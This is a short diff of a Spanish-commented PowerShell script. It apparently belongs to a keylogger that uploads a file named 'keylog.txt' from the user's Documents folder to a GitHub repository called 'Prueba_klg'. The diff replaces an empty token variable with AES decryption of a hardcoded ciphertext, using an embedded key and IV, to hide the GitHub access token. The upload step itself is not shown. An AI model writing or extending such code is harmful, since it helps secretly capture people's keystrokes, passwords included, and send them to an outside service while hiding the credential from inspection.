@@ -1,5 +1,30 @@
+# Texto cifrado en Base64
+$cipherTextBase64 = "MNa/Fo2WLWXGPhyiWU7/igluezCMTycMijy0LI9KTBQiXOfbZq7nSA=="
+
+# Clave en Base64 (debe ser de 256 bits / 32 bytes)
+$keyBase64 = "o7EVsJZqSnmBhyCOSzo1TOPMzgehP+uGSazuhk8LFO4="
+
+# IV en Base64 (debe ser de 128 bits / 16 bytes)
+$ivBase64 = "Gt5xg+BkY/KtLtOMvTlHmA=="
+
+# Convertir de Base64 a bytes
+$key = [Convert]::FromBase64String($keyBase64)
+$iv = [Convert]::FromBase64String($ivBase64)
+$cipherText = [Convert]::FromBase64String($cipherTextBase64)
+
+# Crear el objeto AES y configurar la clave y el IV
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $key
+$aes.IV = $iv
+
+# Crear el descifrador y procesar el texto cifrado
+$decryptor = $aes.CreateDecryptor()
+$plainBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
+
+# Convertir los bytes de vuelta a texto
+$token = [System.Text.Encoding]::UTF8.GetString($plainBytes)
+
 # Variables
-$token = ""  # Reemplaza con tu token de acceso personal de GitHub
 $repoOwner = "SAHIBADAS"  # Reemplaza con tu nombre de usuario o la organización del repositorio
 $repoName = "Prueba_klg"  # Reemplaza con el nombre de tu repositorio
 $filePath = "$env:USERPROFILE\Documentos\keylog.txt"
